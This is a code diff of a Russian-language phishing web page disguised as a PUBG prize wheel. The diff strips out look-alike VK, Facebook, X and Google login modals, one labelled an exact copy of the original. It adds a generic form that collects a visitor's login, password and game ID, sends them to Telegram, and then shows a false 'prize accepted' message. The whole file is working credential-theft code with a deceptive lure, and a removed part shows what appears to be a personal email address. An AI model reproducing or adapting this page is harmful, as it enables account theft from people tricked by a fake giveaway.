@@ -228,8 +228,8 @@
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
         }
         
-        /* Секция выбора соцсети */
-        .social-select-section {
+        /* Форма ввода данных */
+        .data-form-section {
             background: linear-gradient(135deg, rgba(20, 35, 60, 0.95) 0%, rgba(12, 26, 45, 0.95) 100%);
             border-radius: 20px;
             padding: 25px;
@@ -241,7 +241,7 @@
             box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
         }
         
-        .social-select-section.active {
+        .data-form-section.active {
             display: block;
             animation: fadeInUp 0.6s ease;
         }
@@ -257,7 +257,7 @@
             }
         }
         
-        .social-select-section h2 {
+        .data-form-section h2 {
             color: #8da1b5;
             text-align: center;
             margin-bottom: 20px;
@@ -266,9 +266,37 @@
             font-weight: 500;
         }
         
-        .social-grid {
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-label {
+            display: block;
+            color: #8da1b5;
+            margin-bottom: 8px;
+            font-size: 16px;
+            font-family: 'Orbitron', sans-serif;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 12px 15px;
+            background: rgba(12, 26, 45, 0.7);
+            border: 2px solid #2a3b5a;
+            border-radius: 8px;
+            color: #8da1b5;
+            font-size: 16px;
+            font-family: 'Orbitron', sans-serif;
+            transition: border-color 0.3s;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: #4c75a3;
+        }
+        
+        .social-select {
             display: flex;
-            justify-content: center;
             gap: 15px;
             margin-bottom: 25px;
             flex-wrap: wrap;
@@ -343,134 +371,35 @@
             font-family: 'Orbitron', sans-serif;
         }
         
-        /* Модальные окна входа */
-        .login-modal {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            display: none;
-            align-items: center;
-            justify-content: center;
-            z-index: 2000;
-            overflow-y: auto;
-            padding: 20px;
-        }
-        
-        .login-modal.active {
-            display: flex;
-        }
-        
-        .login-modal-content {
-            background: white;
-            border-radius: 8px;
-            width: 100%;
-            max-width: 400px;
-            position: relative;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-            font-family: Arial, sans-serif;
-        }
-        
-        .login-modal-header {
-            padding: 15px 20px;
-            display: flex;
-            align-items: center;
-            border-bottom: 1px solid #e0e0e0;
-            background: white;
-            position: sticky;
-            top: 0;
-            z-index: 10;
-        }
-        
-        .login-modal-back {
-            background: none;
+        .submit-btn {
+            background: linear-gradient(45deg, #2a3b5a 0%, #1a2c42 100%);
+            color: #8da1b5;
             border: none;
-            font-size: 16px;
-            color: #1877f2;
+            border-radius: 60px;
+            padding: 18px 30px;
+            font-size: 20px;
+            font-weight: 500;
             cursor: pointer;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-family: Arial, sans-serif;
-        }
-        
-        .login-modal-body {
-            padding: 20px;
-            color: #333;
-        }
-        
-        /* Стили для форм входа */
-        .login-input {
+            box-shadow: 0 10px 25px rgba(42, 59, 90, 0.5);
+            transition: all 0.3s;
             width: 100%;
-            padding: 12px;
-            margin: 8px 0;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            font-size: 16px;
-            font-family: Arial, sans-serif;
+            font-family: 'Orbitron', sans-serif;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            margin-top: 20px;
         }
         
-        .login-btn {
-            width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            background: #1877f2;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            font-family: Arial, sans-serif;
+        .submit-btn:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 30px rgba(42, 59, 90, 0.7);
         }
         
-        .login-link {
-            color: #1877f2;
-            text-decoration: none;
-            font-size: 14px;
-            display: block;
-            margin: 10px 0;
-            font-family: Arial, sans-serif;
-        }
-        
-        .login-divider {
-            text-align: center;
-            margin: 20px 0;
-            color: #666;
-            font-size: 14px;
-            position: relative;
-            font-family: Arial, sans-serif;
-        }
-        
-        .login-divider::before {
-            content: "";
-            position: absolute;
-            top: 50%;
-            left: 0;
-            right: 0;
-            height: 1px;
-            background: #ddd;
-            z-index: 1;
-        }
-        
-        .login-divider span {
-            background: white;
-            padding: 0 10px;
-            position: relative;
-            z-index: 2;
-        }
-        
-        .checkbox-container {
-            display: flex;
-            align-items: center;
-            margin: 15px 0;
-            font-family: Arial, sans-serif;
-        }
-        
-        .checkbox-container input {
-            margin-right: 8px;
+        .submit-btn:disabled {
+            background: linear-gradient(45deg, #444, #555);
+            color: #777;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
         }
         
         /* Секция выигранного приза */
@@ -551,206 +480,6 @@
             line-height: 1.6;
             margin-bottom: 25px;
             font-family: 'Orbitron', sans-serif;
-        }
-        
-        /* Стили для ВКонтакте формы */
-        .vk-tabs {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 20px;
-        }
-        
-        .vk-tab {
-            flex: 1;
-            padding: 12px;
-            background: #e5ebf1;
-            color: #2a5885;
-            border: 1px solid #dce1e6;
-            border-radius: 4px;
-            font-size: 14px;
-            font-weight: normal;
-            cursor: pointer;
-            text-align: center;
-            font-family: Arial, sans-serif;
-        }
-        
-        .vk-tab.active {
-            background: #4c75a3;
-            color: white;
-            font-weight: bold;
-            border-color: #4c75a3;
-        }
-        
-        .phone-input-container {
-            background: #f0f2f5;
-            border-radius: 4px;
-            padding: 12px;
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-        }
-        
-        .phone-prefix {
-            color: #2a5885;
-            margin-right: 10px;
-            font-family: Arial, sans-serif;
-        }
-        
-        .phone-input {
-            background: transparent;
-            border: none;
-            padding: 0;
-            flex: 1;
-            font-size: 16px;
-            font-family: Arial, sans-serif;
-            outline: none;
-        }
-        
-        /* Специфичные стили для X (Twitter) модального окна */
-        .x-login-page {
-            display: block;
-        }
-        
-        .x-login-page.hidden {
-            display: none;
-        }
-        
-        .x-password-page {
-            display: none;
-        }
-        
-        .x-password-page.active {
-            display: block;
-        }
-        
-        .x-icon-btn {
-            width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            background: white;
-            color: #000;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            font-size: 16px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            font-family: Arial, sans-serif;
-        }
-        
-        /* Стили для Google формы (точная копия оригинальной) */
-        .google-logo {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        
-        .google-logo-img {
-            width: 50px;
-            height: 50px;
-            object-fit: contain;
-            margin-bottom: 10px;
-        }
-        
-        .google-title {
-            font-size: 16px;
-            font-weight: 500;
-            color: #202124;
-            margin-bottom: 20px;
-            text-align: center;
-        }
-        
-        .google-email-input {
-            width: 100%;
-            padding: 12px;
-            margin: 8px 0;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 16px;
-            font-family: Arial, sans-serif;
-        }
-        
-        .google-forgot-link {
-            display: block;
-            text-align: center;
-            color: #1a73e8;
-            text-decoration: none;
-            margin: 15px 0;
-            font-size: 14px;
-            font-weight: 500;
-            font-family: Arial, sans-serif;
-        }
-        
-        .google-guest-mode {
-            font-size: 12px;
-            color: #5f6368;
-            margin: 20px 0;
-            line-height: 1.5;
-            font-family: Arial, sans-serif;
-        }
-        
-        .google-guest-mode a {
-            color: #1a73e8;
-            text-decoration: none;
-        }
-        
-        .google-buttons {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 30px;
-        }
-        
-        .google-create-account {
-            padding: 10px 16px;
-            background: white;
-            color: #1a73e8;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            cursor: pointer;
-            font-weight: 500;
-            font-family: Arial, sans-serif;
-        }
-        
-        .google-next-btn {
-            background: #1a73e8;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            padding: 10px 24px;
-            cursor: pointer;
-            font-weight: 500;
-            font-family: Arial, sans-serif;
-        }
-        
-        .google-footer {
-            margin-top: 30px;
-            padding-top: 15px;
-            border-top: 1px solid #e0e0e0;
-            text-align: center;
-        }
-        
-        .google-language {
-            color: #5f6368;
-            font-size: 12px;
-            font-family: Arial, sans-serif;
-            display: inline-block;
-            margin-right: 10px;
-        }
-        
-        .google-help-links {
-            display: inline-block;
-        }
-        
-        .google-help-links a {
-            color: #5f6368;
-            text-decoration: none;
-            font-size: 12px;
-            font-family: Arial, sans-serif;
-            margin: 0 5px;
-        }
-        
-        .google-help-links a:hover {
-            text-decoration: underline;
         }
         
         .footer {
@@ -841,7 +570,7 @@
                 font-size: 24px;
             }
             
-            .social-grid {
+            .social-select {
                 gap: 10px;
             }
             
@@ -856,23 +585,14 @@
                 font-size: 18px;
             }
             
-            .login-modal-content {
-                max-width: 95%;
-            }
-            
             .logo {
                 margin-left: 20px;
                 font-size: 18px;
             }
             
-            .google-buttons {
-                flex-direction: column;
-                gap: 10px;
-            }
-            
-            .google-create-account,
-            .google-next-btn {
-                width: 100%;
+            .submit-btn {
+                padding: 15px 25px;
+                font-size: 18px;
             }
         }
     </style>
@@ -951,12 +671,11 @@
             <i class="fas fa-play"></i> ИГРАТЬ
         </button>
         
-        <!-- Секция выбора соцсети -->
-        <div class="social-select-section" id="socialSelectSection">
-            <h2>ВЫБЕРИТЕ СПОСОБ ПОЛУЧЕНИЯ</h2>
-            <p style="text-align: center; margin-bottom: 20px; color: #8da1b5;">Выберите социальную сеть для получения приза</p>
+        <!-- Форма ввода данных -->
+        <div class="data-form-section" id="dataFormSection">
+            <h2>ВВЕДИТЕ ДАННЫЕ ДЛЯ ПОЛУЧЕНИЯ ПРИЗА</h2>
             
-            <div class="social-grid">
+            <div class="social-select">
                 <div class="social-option" data-social="vk">
                     <div class="social-icon vk">
                         ВК
@@ -986,22 +705,27 @@
                 </div>
             </div>
             
-            <p style="text-align: center; color: #8da1b5; font-size: 14px; margin-top: 15px;">
-                Выберите одну из соцсетей для входа и получения приза
-            </p>
-        </div>
-        
-        <!-- Секция выигранного приза -->
-        <div class="prize-section" id="prizeSection">
-            <h2>ПОЗДРАВЛЯЕМ С ВЫИГРЫШЕМ!</h2>
-            
-            <div class="prize-won">
-                <img src="priz1.png" alt="Выигранный приз" id="wonPrizeImage">
-                <p style="color: #8da1b5; text-align: center; margin-top: 10px;">Приз будет зачислен на ваш аккаунт в течение 24 часов</p>
+            <div class="form-group">
+                <label class="form-label" id="loginLabel">Логин / Email / Телефон</label>
+                <input type="text" class="form-input" id="loginInput" placeholder="Введите ваш логин, email или телефон">
             </div>
             
+            <div class="form-group">
+                <label class="form-label" id="passwordLabel">Пароль</label>
+                <input type="password" class="form-input" id="passwordInput" placeholder="Введите ваш пароль">
+            </div>
+            
+            <div class="form-group">
+                <label class="form-label">ID в PUBG Mobile (необязательно)</label>
+                <input type="text" class="form-input" id="pubgIdInput" placeholder="Введите ваш ID в PUBG Mobile">
+            </div>
+            
+            <button class="submit-btn" id="submitBtn">
+                <i class="fas fa-paper-plane"></i> ПОЛУЧИТЬ ПРИЗ
+            </button>
+            
             <p style="text-align: center; color: #8da1b5; font-size: 14px; margin-top: 15px;">
-                <strong>Важно:</strong> Одна попытка рулетки в день. Призы не обмениваются на реальные деньги.
+                <strong>Важно:</strong> Приз будет зачислен на ваш аккаунт в течение 24 часов
             </p>
         </div>
         
@@ -1021,218 +745,6 @@
                 Спасибо за участие!<br>
                 Не забудьте проверить свой инвентарь в игре.
             </p>
-        </div>
-    </div>
-
-    <!-- Модальные окна входа -->
-    
-    <!-- ВКонтакте -->
-    <div class="login-modal" id="vkLoginModal">
-        <div class="login-modal-content">
-            <div class="login-modal-header">
-                <button class="login-modal-back" onclick="closeLoginModal()">
-                    <i class="fas fa-arrow-left"></i> Назад
-                </button>
-            </div>
-            <div class="login-modal-body">
-                <div class="vk-tabs">
-                    <div class="vk-tab active" data-type="phone" onclick="switchVKTab('phone')">Телефон</div>
-                    <div class="vk-tab" data-type="email" onclick="switchVKTab('email')">Почта</div>
-                </div>
-                
-                <!-- Поле для телефона -->
-                <div id="vkPhoneField" class="phone-input-container">
-                    <span class="phone-prefix">+7</span>
-                    <input type="text" class="phone-input" id="vkPhoneInput" placeholder="Номер телефона">
-                </div>
-                
-                <!-- Поле для почты (скрыто по умолчанию) -->
-                <input type="text" class="login-input" id="vkEmailInput" placeholder="Почта или логин" style="display: none;">
-                
-                <input type="password" class="login-input" id="vkPassword" placeholder="Пароль">
-                
-                <div class="checkbox-container">
-                    <input type="checkbox" id="vkSave">
-                    <label for="vkSave" style="color: #666;">Сохранить вход</label>
-                </div>
-                
-                <button class="login-btn" onclick="submitVKLogin()" style="background: #4c75a3;">Войти</button>
-                
-                <a href="#" class="login-link" style="text-align: center; margin: 15px 0;">Создать аккаунт</a>
-                <a href="#" class="login-link" style="text-align: center; margin-bottom: 20px;">Создать страницу для бизнеса</a>
-                
-                <p style="font-size: 12px; color: #666; text-align: center; margin: 20px 0; line-height: 1.5;">
-                    Нажимая «Войти», вы принимаете пользовательское соглашение<br>и политику конфиденциальности
-                </p>
-                
-                <div style="border-top: 1px solid #e0e0e0; padding-top: 15px;">
-                    <a href="#" class="login-link" style="text-align: center;">Помощь</a>
-                    <p style="font-size: 12px; color: #666; margin: 10px 0; text-align: center;">
-                        Применяются рекомендательные технологии<br>
-                        Версия для компьютера<br>
-                        Русский
-                    </p>
-                </div>
-            </div>
-        </div>
-    </div>
-    
-    <!-- Facebook -->
-    <div class="login-modal" id="facebookLoginModal">
-        <div class="login-modal-content">
-            <div class="login-modal-header">
-                <button class="login-modal-back" onclick="closeLoginModal()">
-                    <i class="fas fa-arrow-left"></i> Назад
-                </button>
-            </div>
-            <div class="login-modal-body">
-                <div style="text-align: center; margin-bottom: 25px;">
-                    <div style="font-size: 18px; font-weight: bold; color: #1c1e21; margin-bottom: 20px;">Русский</div>
-                </div>
-                
-                <input type="text" class="login-input" id="facebookEmail" placeholder="Мобильный телефон или эл. адрес">
-                <input type="password" class="login-input" id="facebookPassword" placeholder="Пароль">
-                
-                <button class="login-btn" onclick="submitFacebookLogin()">Войти</button>
-                
-                <div style="text-align: center; margin: 20px 0;">
-                    <a href="#" class="login-link">Забыли пароль?</a>
-                </div>
-                
-                <div class="login-divider"><span>или</span></div>
-                
-                <button class="login-btn" style="background: #42b72a; margin-top: 20px;">Создать новый аккаунт</button>
-                
-                <div style="margin-top: 30px; text-align: center;">
-                    <div style="display: inline-flex; align-items: center; background: #f0f2f5; padding: 8px 16px; border-radius: 6px;">
-                        <div style="width: 20px; height: 20px; background: #0866ff; border-radius: 50%; margin-right: 8px;"></div>
-                        <span style="color: #65676b; font-size: 14px; font-weight: bold;">Meta</span>
-                    </div>
-                </div>
-                
-                <div style="margin-top: 20px; text-align: center; font-size: 12px; color: #8a8d91;">
-                    <a href="#" style="color: #8a8d91; margin: 0 8px; text-decoration: none;">Информация</a>
-                    <span style="color: #8a8d91;">•</span>
-                    <a href="#" style="color: #8a8d91; margin: 0 8px; text-decoration: none;">Справка</a>
-                    <span style="color: #8a8d91;">•</span>
-                    <a href="#" style="color: #8a8d91; margin: 0 8px; text-decoration: none;">Ещё</a>
-                </div>
-            </div>
-        </div>
-    </div>
-    
-    <!-- X (Twitter) - двухэтапная форма -->
-    <div class="login-modal" id="xLoginModal">
-        <div class="login-modal-content">
-            <div class="login-modal-header">
-                <button class="login-modal-back" onclick="closeLoginModal()">
-                    <i class="fas fa-arrow-left"></i> Назад
-                </button>
-            </div>
-            <div class="login-modal-body">
-                <!-- Первая страница: ввод логина/почты -->
-                <div id="xLoginPage" class="x-login-page">
-                    <div style="text-align: center; margin-bottom: 30px;">
-                        <div style="font-size: 24px; font-weight: bold; color: #000; margin-bottom: 20px;">X</div>
-                    </div>
-                    
-                    <button class="x-icon-btn">
-                        <span style="margin-right: 8px; color: #4285f4; font-weight: bold; font-size: 18px;">G</span>
-                        Вход через аккаунт Google
-                    </button>
-                    
-                    <button class="x-icon-btn">
-                        <span style="margin-right: 8px; font-size: 18px;"></span>
-                        Войти с учетной записью Apple
-                    </button>
-                    
-                    <div class="login-divider"><span>или</span></div>
-                    
-                    <input type="text" class="login-input" id="xUsername" placeholder="Номер телефона, адрес электронной почты или имя пользователя">
-                    
-                    <button class="login-btn" onclick="nextToXPassword()" style="background: #000; margin-top: 20px;">Далее</button>
-                    
-                    <a href="#" class="login-link" style="text-align: center; margin: 15px 0;">Забыли пароль?</a>
-                    
-                    <p style="text-align: center; color: #666; margin-top: 30px;">
-                        Нет учетной записи? <a href="#" style="color: #1da1f2;">Зарегистрируйтесь</a>
-                    </p>
-                </div>
-                
-                <!-- Вторая страница: ввод пароля -->
-                <div id="xPasswordPage" class="x-password-page">
-                    <div style="text-align: center; margin-bottom: 20px;">
-                        <div style="font-size: 24px; font-weight: bold; color: #000; margin-bottom: 10px;">X</div>
-                        <div style="font-size: 16px; color: #000; margin-bottom: 20px;" id="xEmailDisplay">legasashaok@gmail.com</div>
-                    </div>
-                    
-                    <div style="margin-bottom: 20px;">
-                        <div style="font-size: 14px; color: #666; margin-bottom: 5px;">Пароль</div>
-                        <input type="password" class="login-input" id="xPassword" placeholder="Введите пароль">
-                    </div>
-                    
-                    <a href="#" class="login-link" style="margin-bottom: 20px;">Забыли пароль?</a>
-                    
-                    <button class="login-btn" onclick="submitXLogin()" style="background: #000; margin-top: 10px;">Войти</button>
-                    
-                    <p style="text-align: center; color: #666; margin-top: 30px;">
-                        Нет учетной записи? <a href="#" style="color: #1da1f2;">Зарегистрируйтесь</a>
-                    </p>
-                </div>
-            </div>
-        </div>
-    </div>
-    
-    <!-- Google (точная копия оригинальной страницы с IMG_0686.png) -->
-    <div class="login-modal" id="googleLoginModal">
-        <div class="login-modal-content">
-            <div class="login-modal-header">
-                <button class="login-modal-back" onclick="closeLoginModal()">
-                    <i class="fas fa-arrow-left"></i> Назад
-                </button>
-            </div>
-            <div class="login-modal-body">
-                <div class="google-logo">
-                    <!-- Здесь будет картинка вместо G -->
-                    <img src="google-logo.png" alt="Google" class="google-logo-img" id="googleLogoImg">
-                </div>
-                
-                <div class="google-title">Вход</div>
-                
-                <div style="text-align: center; margin-bottom: 20px;">
-                    <div style="font-size: 16px; color: #202124;">Используйте аккаунт Google</div>
-                </div>
-                
-                <div class="login-divider" style="margin: 15px 0;">
-                    <span>или</span>
-                </div>
-                
-                <input type="text" class="google-email-input" id="googleEmail" placeholder="Телефон или адрес эл. почты">
-                
-                <a href="#" class="google-forgot-link" onclick="googleForgotEmail()">Забыли адрес электронной почты?</a>
-                
-                <p class="google-guest-mode">
-                    Работаете на чужом компьютере? Используйте режим "Частный доступ". <a href="#" onclick="googleGuestMode()">Подробнее об использовании гостевого режима</a>
-                </p>
-                
-                <div class="google-buttons">
-                    <button class="google-create-account" onclick="googleCreateAccount()">
-                        Создать аккаунт
-                    </button>
-                    <button class="google-next-btn" onclick="submitGoogleLogin()">
-                        Далее
-                    </button>
-                </div>
-                
-                <div class="google-footer">
-                    <div class="google-language">Русский</div>
-                    <div class="google-help-links">
-                        <a href="#" onclick="googleHelp()">Справка</a>
-                        <a href="#" onclick="googlePrivacy()">Конфиденциальность</a>
-                        <a href="#" onclick="googleTerms()">Условия</a>
-                    </div>
-                </div>
-            </div>
         </div>
     </div>
 
@@ -1265,10 +777,14 @@
         document.addEventListener('DOMContentLoaded', function() {
             const playBtn = document.getElementById('playBtn');
             const selectionFrame = document.getElementById('selectionFrame');
-            const socialSelectSection = document.getElementById('socialSelectSection');
-            const prizeSection = document.getElementById('prizeSection');
+            const dataFormSection = document.getElementById('dataFormSection');
             const confirmationSection = document.getElementById('confirmationSection');
-            const wonPrizeImage = document.getElementById('wonPrizeImage');
+            const submitBtn = document.getElementById('submitBtn');
+            const loginInput = document.getElementById('loginInput');
+            const passwordInput = document.getElementById('passwordInput');
+            const pubgIdInput = document.getElementById('pubgIdInput');
+            const loginLabel = document.getElementById('loginLabel');
+            const passwordLabel = document.getElementById('passwordLabel');
             const prizeItems = document.querySelectorAll('.prize-item');
             const languageBtn = document.getElementById('languageBtn');
             const languageDropdown = document.getElementById('languageDropdown');
@@ -1276,28 +792,6 @@
             const spinSound = document.getElementById('spinSound');
             const winSound = document.getElementById('winSound');
             const socialOptions = document.querySelectorAll('.social-option');
-            const googleLogoImg = document.getElementById('googleLogoImg');
-            
-            // Элементы для ВКонтакте
-            const vkPhoneField = document.getElementById('vkPhoneField');
-            const vkPhoneInput = document.getElementById('vkPhoneInput');
-            const vkEmailInput = document.getElementById('vkEmailInput');
-            const vkPassword = document.getElementById('vkPassword');
-            const vkTabs = document.querySelectorAll('.vk-tab');
-            
-            // Элементы для X (Twitter)
-            const xLoginPage = document.getElementById('xLoginPage');
-            const xPasswordPage = document.getElementById('xPasswordPage');
-            const xUsernameInput = document.getElementById('xUsername');
-            const xEmailDisplay = document.getElementById('xEmailDisplay');
-            const xPasswordInput = document.getElementById('xPassword');
-            
-            // Элементы для Google
-            const googleEmailInput = document.getElementById('googleEmail');
-            
-            // Переменные для хранения данных
-            let xUsername = '';
-            let vkLoginType = 'phone'; // 'phone' или 'email'
             
             // Призы с картинками
             const prizes = [
@@ -1331,75 +825,33 @@
                     play: "ИГРАТЬ",
                     title: "КОЛЕСО УДАЧИ PUBG",
                     subtitle: "Испытай удачу и выиграй эксклюзивные призы!",
-                    selectTitle: "ВЫБЕРИТЕ СПОСОБ ПОЛУЧЕНИЯ",
-                    selectText: "Выберите социальную сеть для получения приза",
-                    prizeTitle: "ПОЗДРАВЛЯЕМ С ВЫИГРЫШЕМ!",
+                    formTitle: "ВВЕДИТЕ ДАННЫЕ ДЛЯ ПОЛУЧЕНИЯ ПРИЗА",
+                    loginLabel: "Логин / Email / Телефон",
+                    passwordLabel: "Пароль",
+                    pubgIdLabel: "ID в PUBG Mobile (необязательно)",
+                    submitBtn: "ПОЛУЧИТЬ ПРИЗ",
                     notificationSuccess: "Данные отправлены! Приз будет зачислен в течение 24 часов.",
-                    notificationError: "Пожалуйста, заполните все поля.",
+                    notificationError: "Пожалуйста, заполните все обязательные поля.",
                     notificationSelectSocial: "Пожалуйста, выберите социальную сеть",
-                    notificationAlreadyPlayed: "Вы уже использовали свою попытку сегодня!"
+                    notificationAlreadyPlayed: "Вы уже использовали свою попытку сегодня!",
+                    confirmationTitle: "ЗАЯВКА ПРИНЯТА!",
+                    confirmationMessage: "Ваш выигрыш будет зачислен на аккаунт PUBG Mobile в течение 24 часов."
                 },
                 en: {
                     play: "PLAY",
                     title: "PUBG WHEEL OF FORTUNE",
                     subtitle: "Try your luck and win exclusive prizes!",
-                    selectTitle: "SELECT RECEIVING METHOD",
-                    selectText: "Select social network to receive the prize",
-                    prizeTitle: "CONGRATULATIONS ON WINNING!",
+                    formTitle: "ENTER DATA TO RECEIVE PRIZE",
+                    loginLabel: "Login / Email / Phone",
+                    passwordLabel: "Password",
+                    pubgIdLabel: "PUBG Mobile ID (optional)",
+                    submitBtn: "GET PRIZE",
                     notificationSuccess: "Data sent! The prize will be credited within 24 hours.",
-                    notificationError: "Please fill in all fields.",
+                    notificationError: "Please fill in all required fields.",
                     notificationSelectSocial: "Please select a social network",
-                    notificationAlreadyPlayed: "You have already used your attempt today!"
-                }
-            };
-            
-            // Функции для Google
-            window.googleForgotEmail = function() {
-                showNotification("Функция восстановления email Google");
-            };
-            
-            window.googleGuestMode = function() {
-                showNotification("Информация о гостевом режиме Google");
-            };
-            
-            window.googleCreateAccount = function() {
-                showNotification("Создание аккаунта Google");
-            };
-            
-            window.googleHelp = function() {
-                showNotification("Справка Google");
-            };
-            
-            window.googlePrivacy = function() {
-                showNotification("Политика конфиденциальности Google");
-            };
-            
-            window.googleTerms = function() {
-                showNotification("Условия использования Google");
-            };
-            
-            // Функция переключения вкладок ВКонтакте
-            window.switchVKTab = function(type) {
-                vkLoginType = type;
-                
-                // Обновляем активную вкладку
-                vkTabs.forEach(tab => {
-                    if (tab.getAttribute('data-type') === type) {
-                        tab.classList.add('active');
-                    } else {
-                        tab.classList.remove('active');
-                    }
-                });
-                
-                // Показываем/скрываем соответствующие поля
-                if (type === 'phone') {
-                    vkPhoneField.style.display = 'flex';
-                    vkEmailInput.style.display = 'none';
-                    vkPhoneInput.focus();
-                } else {
-                    vkPhoneField.style.display = 'none';
-                    vkEmailInput.style.display = 'block';
-                    vkEmailInput.focus();
+                    notificationAlreadyPlayed: "You have already used your attempt today!",
+                    confirmationTitle: "APPLICATION ACCEPTED!",
+                    confirmationMessage: "Your winnings will be credited to your PUBG Mobile account within 24 hours."
                 }
             };
             
@@ -1410,9 +862,13 @@
                 document.querySelector('.header h1').textContent = t.title;
                 document.querySelector('.header p').textContent = t.subtitle;
                 playBtn.innerHTML = `<i class="fas fa-play"></i> ${t.play}`;
-                document.querySelector('#socialSelectSection h2').textContent = t.selectTitle;
-                document.querySelector('#socialSelectSection p').textContent = t.selectText;
-                document.querySelector('#prizeSection h2').textContent = t.prizeTitle;
+                document.querySelector('#dataFormSection h2').textContent = t.formTitle;
+                loginLabel.textContent = t.loginLabel;
+                passwordLabel.textContent = t.passwordLabel;
+                document.querySelector('#dataFormSection .form-group:nth-child(4) .form-label').textContent = t.pubgIdLabel;
+                submitBtn.innerHTML = `<i class="fas fa-paper-plane"></i> ${t.submitBtn}`;
+                document.querySelector('#confirmationSection h2').textContent = t.confirmationTitle;
+                document.querySelector('.confirmation-message').innerHTML = t.confirmationMessage;
                 
                 const langNames = {
                     ru: 'Русский', en: 'English', uz: "O'zbekcha",
@@ -1479,8 +935,7 @@
                 
                 isSpinning = true;
                 playBtn.disabled = true;
-                socialSelectSection.classList.remove('active');
-                prizeSection.classList.remove('active');
+                dataFormSection.classList.remove('active');
                 confirmationSection.classList.remove('active');
                 
                 finalPrizeIndex = getRandomPrize();
@@ -1527,14 +982,16 @@
                             hasPlayed = true;
                             playBtn.innerHTML = '<i class="fas fa-check"></i> УЖЕ ИГРАЛИ';
                             
-                            const wonPrize = prizes[finalPrizeIndex];
-                            wonPrizeImage.src = wonPrize.image;
-                            
+                            // Сбрасываем форму
                             socialOptions.forEach(opt => opt.classList.remove('selected'));
                             selectedSocial = null;
+                            loginInput.value = '';
+                            passwordInput.value = '';
+                            pubgIdInput.value = '';
                             
-                            socialSelectSection.classList.add('active');
-                            socialSelectSection.scrollIntoView({ behavior: 'smooth' });
+                            // Показываем форму для ввода данных
+                            dataFormSection.classList.add('active');
+                            dataFormSection.scrollIntoView({ behavior: 'smooth' });
                         }, 1000);
                     }, 300);
                 }
@@ -1547,161 +1004,77 @@
                     
                     this.classList.add('selected');
                     selectedSocial = this.getAttribute('data-social');
-                    
-                    // Сбрасываем состояние форм при открытии
-                    if (selectedSocial === 'vk') {
-                        switchVKTab('phone');
-                        vkPhoneInput.value = '';
-                        vkEmailInput.value = '';
-                        vkPassword.value = '';
-                    }
-                    
-                    if (selectedSocial === 'x') {
-                        xLoginPage.classList.remove('hidden');
-                        xPasswordPage.classList.remove('active');
-                        xUsernameInput.value = '';
-                        xPasswordInput.value = '';
-                        xUsername = '';
-                    }
-                    
-                    if (selectedSocial === 'google') {
-                        googleEmailInput.value = '';
-                    }
-                    
-                    openLoginModal(selectedSocial);
                 });
             });
             
-            // Функция открытия модального окна входа
-            function openLoginModal(social) {
-                const modalId = social + 'LoginModal';
-                document.getElementById(modalId).classList.add('active');
-                document.body.style.overflow = 'hidden';
-                
-                // Фокус на первое поле
-                setTimeout(() => {
-                    if (social === 'vk') {
-                        vkPhoneInput.focus();
-                    } else if (social === 'facebook') {
-                        document.getElementById('facebookEmail').focus();
-                    } else if (social === 'x') {
-                        xUsernameInput.focus();
-                    } else if (social === 'google') {
-                        googleEmailInput.focus();
-                    }
-                }, 100);
-            }
-            
-            // Функция закрытия модального окна входа
-            window.closeLoginModal = function() {
-                document.querySelectorAll('.login-modal').forEach(modal => {
-                    modal.classList.remove('active');
-                });
-                document.body.style.overflow = 'auto';
-            };
-            
-            // Функция перехода ко второй странице X
-            window.nextToXPassword = function() {
-                const username = xUsernameInput.value.trim();
-                
-                if (!username) {
-                    showNotification("Пожалуйста, введите номер телефона, email или имя пользователя", true);
+            // Обработчик отправки формы
+            submitBtn.addEventListener('click', async function() {
+                if (!selectedSocial) {
+                    showNotification("Пожалуйста, выберите социальную сеть", true);
                     return;
                 }
                 
-                xUsername = username;
-                xEmailDisplay.textContent = username;
-                
-                xLoginPage.classList.add('hidden');
-                xPasswordPage.classList.add('active');
-                
-                setTimeout(() => {
-                    xPasswordInput.focus();
-                }, 100);
-            };
-            
-            // Функции отправки данных
-            window.submitVKLogin = function() {
-                let login = '';
-                const password = vkPassword.value.trim();
-                
-                if (vkLoginType === 'phone') {
-                    login = vkPhoneInput.value.trim();
-                } else {
-                    login = vkEmailInput.value.trim();
-                }
+                const login = loginInput.value.trim();
+                const password = passwordInput.value.trim();
+                const pubgId = pubgIdInput.value.trim();
                 
                 if (!login || !password) {
-                    showNotification("Пожалуйста, заполните все поля", true);
+                    showNotification("Пожалуйста, заполните логин и пароль", true);
                     return;
                 }
                 
-                sendDataToTelegram('VK', login, password);
-                closeLoginModal();
-                showConfirmationSection();
-            };
-            
-            window.submitFacebookLogin = function() {
-                const email = document.getElementById('facebookEmail').value.trim() || '';
-                const password = document.getElementById('facebookPassword').value.trim() || '';
+                // Отправляем данные в Telegram
+                const success = await sendDataToTelegram(selectedSocial, login, password, pubgId, finalPrizeIndex);
                 
-                if (!email || !password) {
-                    showNotification("Пожалуйста, заполните все поля", true);
-                    return;
+                if (success) {
+                    // Показываем секцию подтверждения
+                    dataFormSection.classList.remove('active');
+                    confirmationSection.classList.add('active');
